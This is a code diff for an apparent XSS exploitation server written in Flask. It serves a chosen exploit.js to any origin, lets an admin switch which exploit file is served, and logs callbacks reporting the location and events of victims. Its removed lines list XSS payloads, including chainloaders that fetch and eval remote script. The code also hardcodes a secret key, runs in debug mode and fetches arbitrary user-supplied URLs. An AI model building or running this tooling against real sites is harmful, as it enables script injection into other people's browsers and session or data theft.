@@ -1,15 +1,37 @@
+from flask import (
+    Flask,
+    send_from_directory,
+    request,
+    render_template_string,
+    jsonify,
+    render_template,
+    session,
+    abort,
+    redirect,
+    url_for
+)
+from flask_cors import CORS
 import requests
-import models.vulnerability
+import logging
+import os
 from bs4 import BeautifulSoup
-from flask import Flask, render_template
 from jinja2 import Environment, FileSystemLoader
-from flask import Flask, send_from_directory
 from models.vulnerability import Vulnerability
 from database import initialize_db, insert_payload, fetch_payloads, populate_payloads
+from payload import payloads
 
 env = Environment(loader = FileSystemLoader('templates'))
 app = Flask(__name__)
-import os
+
+CORS(app, resources={
+    r"/callback": {"origins": "*"},     # Allow all origins for '/callback'
+    r"/": {"origins": "*"},             # Allow all origins for '/'
+})
+
+# Path to the exploit.js file for debugging purposes
+EXPLOIT_FILE_PATH = os.path.abspath("templates/exploit/exploit.js")
+app.config['CURRENT_FILE'] = 'exploit.js'
+
 print(os.path.abspath('static/exploit.js'))
 
 def setup():
@@ -20,90 +42,132 @@ def returnExploit():
     # Log the full path for debugging
     file_path = os.path.abspath("templates/exploit/exploit.js")
     print(f"Looking for file at: {file_path}")
+app.secret_key = 'your_secret_key'  # Needed for session handling
+logging.basicConfig(level=logging.INFO)
+
+
+@app.before_request
+def before_request():
+    # Store the current host in the context for use in templates
+    request.current_host = request.host_url
+
+# Default to 'exploit.js' for all users until changed via admin
+@app.route("/", methods=["GET"])
+def serve_file():
+    # Get the currently selected file from the global configuration
+    current_file = app.config['CURRENT_FILE']
+
+    # Define the path to the requested file
+    base_directory = os.path.abspath("templates/exploit") 
+    file_path = os.path.join(base_directory, current_file)
+
+    # Security: Prevent directory traversal
+    if not file_path.startswith(base_directory):
+        abort(403)  # Forbidden
+
+    # Check if the file exists
     if not os.path.exists(file_path):
-        print("File does not exist!")
         return "File not found", 404
-    return send_from_directory("templates/exploit", "exploit.js")
+
+    # Serve the selected file
+    return send_from_directory(base_directory, current_file)
+
+
+@app.route("/SelectExploit", methods=["GET", "POST"])
+def admin_page():
+    base_directory = os.path.abspath("templates/exploit") 
+
+    if request.method == "POST":
+        # Get the new file from the form data
+        new_file = request.form.get("file")
+        if new_file:
+            # Update the global configuration to store the current file
+            app.config['CURRENT_FILE'] = new_file
+            return redirect(url_for("admin_page"))
+
+    # List all files in the exploit folder
+    available_files = [f for f in os.listdir(base_directory) if os.path.isfile(os.path.join(base_directory, f))]
+
+    # Render the admin page with the list of available files
+    content = render_template("SelectExploit.html", available_files=available_files, current_file=app.config['CURRENT_FILE'])
+    with open('templates/header.html', 'r') as file:
+        header = file.read()
+    return render_template_string(header + content)
+
 
 @app.route("/dashboard")
 def dashboard():
-    return render_template('dashboard-view.html')
-
-def basic_script():
-    return "<script>alert('XSS 1');</script>"
-
-def javascript_uri():
-    return "javascript:alert('XSS 2');"
-
-def input_onfocus():
-    return "<input onfocus='alert(\"XSS 3\")'>"
-
-def image_onerror():
-    return "<img src='x' onerror='alert(\"XSS 4\")'>"
-
-def video_source():
-    return "<video><source onerror='alert(\"XSS 5\")'></video>"
-
-def iframe_srcdoc():
-    return "<iframe srcdoc='<script>alert(\"XSS 6\")</script>'></iframe>"
-
-def xmlhttprequest_load():
-    return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://example.com");a.send();</script>'
-
-def jquery_chainload():
-    return '<script>$.getScript("https://example.com")</script>'
-
-# Define the route for the payloads page
+    content = render_template('dashboard-view.html')
+    # Render the dashboard page with the header
+    with open('templates/header.html', 'r') as file:
+        header = file.read()
+    return render_template_string(header + content)
+    
 @app.route('/payloads')
 def index():
-    payloads = [
-        {
-            'func': basic_script,
-            'title': 'Basic <code>&lt;script&gt;</code> Tag Payload',
-            'description': 'Classic payload',
-        },
-        {
-            'func': javascript_uri,
-            'title': '<code>javascript:</code> URI Payload',
-            'description': 'Link-based XSS',
-        },
-        {
-            'func': input_onfocus,
-            'title': '<code>&lt;input&gt;</code> Tag Payload',
-            'description': 'HTML5 input-based payload',
-        },
-        {
-            'func': image_onerror,
-            'title': '<code>&lt;img&gt;</code> Tag Payload',
-            'description': 'Image-based payload',
-        },
-        {
-            'func': video_source,
-            'title': '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload',
-            'description': 'Video-based payload',
-        },
-        {
-            'func': iframe_srcdoc,
-            'title': '<code>&lt;iframe srcdoc=</code> Tag Payload',
-            'description': 'iframe-based payload',
-        },
-        {
-            'func': xmlhttprequest_load,
-            'title': 'XMLHttpRequest Payload',
-            'description': 'Inline execution chainload payload',
-        },
-        {
-            'func': jquery_chainload,
-            'title': '<code>$.getScript()</code> (jQuery) Payload',
-            'description': 'Chainload payload for sites with jQuery',
-        },
-    ]
-    return render_template('payloads-view.jinja', payloads=payloads)
+    content = render_template('payloads-view.html', payloads=payloads)
+    with open('templates/header.html', 'r') as file:
+        header = file.read()
+    return render_template_string(header + content)
 
+    
 @app.route("/results")
 def found_vulns_page():
-    found_vulns = [Vulnerability('https://example.com', '#username', '/')]
-    return render_template('results-view.jinja', found_vulns=found_vulns)
+    found_vulns = [
+        Vulnerability('https://example.com', '#example', '/example'),
+        Vulnerability('https://github.com', '#example', '/example'),
+    ]
+    content = render_template('results-view.html', found_vulns=found_vulns)
+    with open('templates/header.html', 'r') as file:
+        header = file.read()
+    return render_template_string(header + content)
+
+@app.route("/handle-vuln-data", methods=['POST'])
+def handle_vuln_data():
+    """
+    Gets the vulnerable page HTML by using `requests`. This is used to be able to display a preview of the vulnerable website.
+    This function might later on be (partially) replaced by html2canvas.js.
+    :return:
+    A string with the HTML contents of the vulnerable page that was requested.
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"error": "No JSON data received"}), 400
+    
+    url = data.get('url')
+    element_selector = data.get('element_selector')
+    page_name = data.get('page_name')
+    
+    if not all([url, element_selector, page_name]):
+        return jsonify({"error": "Missing required fields"}), 400
+    
+    # Get the HTML contents from the vulnerable page for displaying in frontend
+    vulnerability = Vulnerability(url, element_selector, page_name)
+    vuln_page_contents = get_page_content(url)
+    
+    return jsonify({"page_content": vuln_page_contents}), 200
+
+@app.route("/exploitselect")
+def select_exploit_page():
+    return render_template("exploitSelect.html")
+
+@app.route('/callback', methods=['POST'])
+def handle_callback():
+    data = request.get_json()
+    if data is None:
+        return jsonify({'error': 'Invalid JSON'}), 400
+
+    app.logger.info(f"Received callback: {data}")
+
+    event = data.get('event')
+    location = data.get('location')
+    timestamp = data.get('timestamp')
+
+    print(f"Event: {event}")
+    print(f"Location: {location}")
+    print(f"Timestamp: {timestamp}")
+
+    return jsonify({'status': 'Callback received'}), 200
 
 
 
@@ -123,4 +187,10 @@ if __name__ == '__main__':
     payloads = fetch_payloads()  # Fetch and print all payloads
     for payload in payloads:
         print(payload)
+    app.run(debug=True)
+def get_page_content(url):
+    r = requests.get(url)
+    return r.text
+
+if __name__ == '__main__':
     app.run(debug=True)
